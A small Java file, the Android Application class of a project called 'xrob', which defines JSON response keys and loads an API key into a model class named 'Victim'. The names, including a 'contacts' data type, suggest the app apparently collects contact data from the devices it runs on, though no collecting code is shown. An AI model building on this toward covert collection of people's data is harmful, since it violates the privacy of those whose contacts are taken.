package com.theah64.xrob.utils;

import android.app.Application;

import com.theah64.xrob.models.Victim;

/**
 * Created by theapache64 on 11/9/16.
 */
public class Xrob extends Application {

    public static final String KEY_ERROR = "error";
    public static final String KEY_MESSAGE = "message";
    public static final String KEY_DATA = "data";
    static final String KEY_ERROR_CODE = "error_code";
    public static final String KEY_DATA_TYPE = "data_type";
    public static final String DATA_TYPE_CONTACTS = "contacts";


    @Override
    public void onCreate() {
        super.onCreate();
        Victim.setApiKey(PrefUtils.getInstance(this).getString(Victim.KEY_API_KEY));
    }
}
